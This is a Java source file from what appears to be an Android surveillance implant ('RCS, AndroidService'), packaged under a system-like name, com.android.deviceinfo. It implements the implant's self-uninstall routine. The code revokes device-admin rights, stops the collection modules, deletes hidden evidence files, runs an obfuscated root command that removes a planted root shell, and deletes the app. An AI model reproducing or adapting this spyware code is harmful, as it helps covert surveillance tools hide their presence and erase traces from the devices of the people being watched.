/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : UninstallAction.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.action;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import com.android.deviceinfo.Core;
import com.android.deviceinfo.Messages;
import com.android.deviceinfo.Root;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.Trigger;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfAction;
import com.android.deviceinfo.evidence.EvidenceCollector;
import com.android.deviceinfo.evidence.Markup;

import com.android.deviceinfo.listener.AR;
import com.android.deviceinfo.manager.ManagerEvent;
import com.android.deviceinfo.manager.ManagerModule;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.Execute;

/**
 * The Class UninstallAction.
 */
public class UninstallAction extends SubActionSlow {

	private static final String TAG = "UninstallAction"; //$NON-NLS-1$

	/**
	 * Instantiates a new uninstall action.
	 * 
	 * @param params
	 *            the conf params
	 */
	public UninstallAction(final ConfAction params) {
		super(params);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
	 */
	@Override
	public boolean execute(Trigger trigger) {
		Status.self().uninstall = true;
		return true;
	}

	/**
	 * Actual execute.
	 */
	public static boolean actualExecute() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualExecute): uninstall");//$NON-NLS-1$
		}

		Status status = Status.self();

		// check Core.taskInit
		final Markup markup = new Markup(0);
		markup.createEmptyMarkup();

		removeAdmin(status.getAppContext());

		boolean ret = stopServices();
		ret &= removeFiles();
		ret &= deleteApplication();
		ret &= removeRoot(status);

		return ret;
	}

	private static boolean removeRoot(Status status) {
		if (status.haveRoot() == true) {
			Process localProcess;

			try {
				// /system/bin/ntpsvd ru (uninstall root shell)
				localProcess = Runtime.getRuntime().exec(Messages.getString("32_32"));

				localProcess.waitFor();
			} catch (Exception e) {
				if (Cfg.EXP) {
					Check.log(e);
				}
				return false;
			}
		}

		return true;
	}

	private static void removeAdmin(Context appContext) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeAdmin) ");
		}
		ComponentName devAdminReceiver = new ComponentName(appContext, AR.class);
		DevicePolicyManager dpm = (DevicePolicyManager) appContext.getSystemService(Context.DEVICE_POLICY_SERVICE);
		dpm.removeActiveAdmin(devAdminReceiver);
	}

	/**
	 * Stop agents and events
	 * 
	 * @return
	 */
	static boolean stopServices() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopServices)");//$NON-NLS-1$
		}

		ManagerModule.self().stopAll();
		ManagerEvent.self().stopAll();
		Status.self().unTriggerAll();
		return true;
	}

	/**
	 * Remove markups and logs
	 * 
	 * @return
	 */
	static boolean removeFiles() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeFiles)");//$NON-NLS-1$
		}

		Markup.removeMarkups();

		final int fileNum = EvidenceCollector.self().removeHidden();
		if (Cfg.DEBUG) {
			Check.log(TAG + " (removeFiles): " + fileNum);//$NON-NLS-1$
		}
		return true;
	}

	private static boolean deleteApplication() {

		boolean ret = false;
		if (Status.haveRoot()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (deleteApplication) try Root");
			}
			ret = deleteApplicationRoot();
		}

		//if (!ret) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (deleteApplication) go with intent");
			}
			ret = deleteApplicationIntent();
		//}

		return ret;
	}

	/**
	 * Deletes the application
	 * 
	 * @return
	 */
	static boolean deleteApplicationIntent() {

		// Core core = Core.self();
		// package:com.android.networking
		final Uri packageURI = Uri.parse("package:" + Status.self().getAppContext().getPackageName()); //$NON-NLS-1$

		if (Cfg.DEBUG) {
			Check.log(TAG + " (deleteApplication): " + packageURI.toString());
		}

		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		Status.getAppContext().startActivity(uninstallIntent);
		return true;
	}

	/**
	 * Deletes the application
	 * 
	 * @return
	 */
	static boolean deleteApplicationRoot() {

		return Root.uninstallRoot();
	}

	@Override
	protected boolean parse(ConfAction params) {
		return true;
	}

}
